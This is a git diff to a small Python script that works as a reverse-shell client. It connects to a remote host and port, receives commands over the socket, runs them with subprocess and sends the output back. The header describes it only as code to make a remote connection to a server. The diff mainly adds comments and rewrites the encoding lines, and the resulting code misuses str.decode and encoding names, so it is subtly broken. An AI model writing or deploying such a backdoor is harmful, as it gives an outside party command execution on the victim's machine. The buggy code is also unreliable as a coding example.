@@ -1,6 +1,6 @@
 # This code is to make a remote connection to the server
 import os
-import subprocess
+import subprocess # This library is used to run commands on the system
 import socket
 
 def socketCreate():
@@ -13,13 +13,18 @@ def connectionEst():
   global host
   global port
   sock.connect((host,port))
+  
   while True:
-    cmd=sock.recv(1024)
-    if cmd[:2]=="cd"
+    # receiving the utf8 encoded msg and decodeing it
+    cmd=str.decode(sock.recv(1024),"utf 8")
+    # subprocess cant change directory and so special check for directory command
+    if (str.decode(cmd[:2],"utf 8")=="cd"):
       os.chdir(cmd[3:])
     else:
+      # Opening subprocess in the bvackground and executing the command and piping the outpur
       sub=subprocess.Popen(cmd[:],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-      cmd.send(sub.stdout.read()+sub.stderr.read())
+      # Sending back output or eroor if any occured
+      sock.send(str.encode(sub.stdout.read()+sub.stderr.read(),"utf 8"))
       
 def main():
   socketCreate()
